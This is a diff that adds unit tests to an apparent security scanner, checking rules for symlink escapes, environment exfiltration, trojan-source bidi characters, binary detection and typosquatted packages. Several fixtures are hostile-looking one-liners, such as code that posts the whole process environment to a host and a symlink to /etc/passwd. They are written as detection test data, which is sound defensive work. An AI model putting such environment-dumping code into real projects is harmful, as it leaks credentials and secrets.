@@ -125,3 +125,64 @@ def test_normal_venv_python_symlink_is_not_flagged_but_a_hostile_one_is(tmp_path
     assert "symlink-escape" not in scan(tmp_path)
     (tmp_path / ".venv/bin/helper").symlink_to("/etc/passwd")
     assert "symlink-escape" in scan(tmp_path)
+
+
+def test_env_exfil_flags_the_whole_environment_not_one_variable(tmp_path: Path) -> None:
+    write(tmp_path, "ok.js", "fetch(process.env.API_URL + '/users')\n")
+    assert "env-exfil" not in scan(tmp_path)
+    write(tmp_path, "bad.js", "fetch(u, {body: JSON.stringify(process.env)})\n")
+    write(tmp_path, "bad.py", "requests.post(u, data=dict(os.environ))\n")
+    fs = [f["file"] for f in findings(tmp_path) if f["rule"] == "env-exfil"]
+    assert sorted(fs) == ["bad.js", "bad.py"]
+
+
+def test_bidi_in_a_data_file_is_medium_but_in_code_is_high(tmp_path: Path) -> None:
+    write(tmp_path, "data.json", '{"t": "abc‮def"}\n')
+    assert {f["severity"] for f in findings(tmp_path) if f["rule"] == "trojan-source"} == {"MEDIUM"}
+    write(tmp_path, "x.js", "var a = 'abc‮def';\n")
+    sev = {f["file"]: f["severity"] for f in findings(tmp_path) if f["rule"] == "trojan-source"}
+    assert sev == {"data.json": "MEDIUM", "x.js": "HIGH"}
+
+
+def macho(filetype: int) -> bytes:
+    return b"\xcf\xfa\xed\xfe" + b"\x07\x00\x00\x01\x03\x00\x00\x00" + filetype.to_bytes(4, "little") + b"\x00" * 32
+
+
+def test_object_files_are_medium_but_executables_stay_high(tmp_path: Path) -> None:
+    (tmp_path / "obj").mkdir()
+    (tmp_path / "obj/x.o").write_bytes(macho(1))  # MH_OBJECT
+    (tmp_path / "obj/run").write_bytes(macho(2))  # MH_EXECUTE, name does not matter
+    elf_obj = b"\x7fELF" + b"\x02\x01\x01" + b"\x00" * 9 + (1).to_bytes(2, "little") + b"\x00" * 32
+    (tmp_path / "obj/y.o").write_bytes(elf_obj)
+    got = {f["file"]: f["severity"] for f in findings(tmp_path) if "binary" in f["rule"]}
+    assert got == {"obj/x.o": "MEDIUM", "obj/y.o": "MEDIUM", "obj/run": "HIGH"}
+
+
+def test_typosquat_catches_swapped_letters(tmp_path: Path) -> None:
+    write(tmp_path, "package.json", json.dumps({"dependencies": {"lodahs": "1"}}))
+    assert "typosquat?" in scan(tmp_path)
+
+
+def test_semgrep_stderr_is_shipped_back_and_shown(tmp_path: Path) -> None:
+    from sandbox_scan.report import merge_findings, read_results
+
+    tgz = tmp_path / "r.tgz"
+    (tmp_path / "semgrep.err").write_text("rule download failed")
+    with tarfile.open(tgz, "w:gz") as tf:
+        tf.add(tmp_path / "semgrep.err", arcname="semgrep.err")
+    _, _, notes, _ = merge_findings(read_results(tgz))
+    assert any("rule download failed" in n for n in notes)
+
+
+def test_dependency_findings_are_listed_before_other_medium_lines() -> None:
+    from sandbox_scan.report import merge_findings
+
+    others = [
+        {"severity": "MEDIUM", "rule": "x", "file": f"a{i}", "line": 1, "detail": "", "snippet": ""} for i in range(20)
+    ]
+    dep = {"severity": "MEDIUM", "rule": "dependency-findings", "file": "zzz", "line": 0, "detail": "", "snippet": ""}
+    import json as j
+
+    res = {"heuristics.json": j.dumps({"findings": [*others, dep], "stats": {}})}
+    findings_, *_ = merge_findings(res)
+    assert findings_[0]["rule"] == "dependency-findings"
